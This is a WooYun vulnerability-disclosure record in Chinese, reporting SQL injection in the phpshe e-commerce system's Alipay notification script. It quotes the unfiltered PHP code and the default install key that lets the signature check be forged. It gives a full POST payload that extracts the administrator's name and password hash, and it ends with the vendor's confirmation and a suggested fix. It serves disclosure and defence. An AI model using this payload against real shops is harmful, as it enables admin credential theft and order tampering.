{"id": 40254, "wybug_id": "wooyun-2015-092055", "wybug_title": "phpshe 最新版 sql注入。", "wybug_corp": "phpshe.com", "wybug_author": "roker", "wybug_date": "2015-01-15 17:40", "wybug_open_date": "2015-04-15 17:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向公众公开  简要描述： rt 详细说明：  /include/plugin/payway/alipay/notify_url_db.php\n$alipayNotify = new AlipayNotify($alipay_config);$verify_result = $alipayNotify->verifyNotify();//验证成功if ($verify_result) {\t\t//商户订单号\t$out_trade_no = $_POST['out_trade_no'];\t//支付宝交易号\t$trade_no = $_POST['trade_no'];\t$info = $db->pe_select('order', array('order_id'=>$out_trade_no));\t//该判断表示买家已在支付宝交易管理中产生了交易记录，但没有付款\tif ($_POST['trade_status'] == 'WAIT_BUYER_PAY') {\t\t\t        echo \"success\";\t\t//请不要修改或删除    }\t//该判断表示买家已在支付宝交易管理中产生了交易记录且付款成功，但卖家没有发货\telseif ($_POST['trade_status'] == 'WAIT_SELLER_SEND_GOODS') {\t\tif ($info['order_state'] == 'notpay') {\t\t\t$order['order_outid'] = $trade_no;\t\t\t$order['order_payway'] = 'alipay_db';\t\t\t$order['order_state'] = 'paid';\t\t\t$order['order_ptime'] = time();\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\t\t}        echo \"success\";\t\t//请不要修改或删除    }\t//该判断表示卖家已经发了货，但买家还没有做确认收货的操作\telseif ($_POST['trade_status'] == 'WAIT_BUYER_CONFIRM_GOODS') {\t\tif ($info['order_state'] == 'paid') {\t\t\t$order['order_state'] = 'send';\t\t\t$order['order_stime'] = time();\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\ntrade_no out_trade_no  都没有过滤，如何 verify_result为 ture？默认安装时，\nalipay_key = esfsclzgahxncgzi3bbe7giwa2ywxyv3\n\nfunction md5Verify($prestr, $sign, $key) {\t$prestr = $prestr . $key;\t$mysgin = md5($prestr);\tif($mysgin == $sign) {\t\treturn true;\t}\n当 sign等于 post的数据与key做md5加密 后的值时，即为ture。前台买个商品，记下订单号\n\n提交数据\n\n\nsign=c716ce88d4e890cb28d5b87366873d8f&out_trade_no=1501150001&trade_no=0',user_address=(select concat(admin_name,0x3c,admin_pw) from pe_admin limit 1),user_phone='1&trade_status=WAIT_SELLER_SEND_GOODS\n然后 查看订单，数据就出来咯~\n\n   漏洞证明：  \n\n   修复方案：  安装时 ，随机生成 key。而不是默认值。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-17 16:23 厂商回复： 感谢@roker 提供代码审计，已将漏洞提交到技术部 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}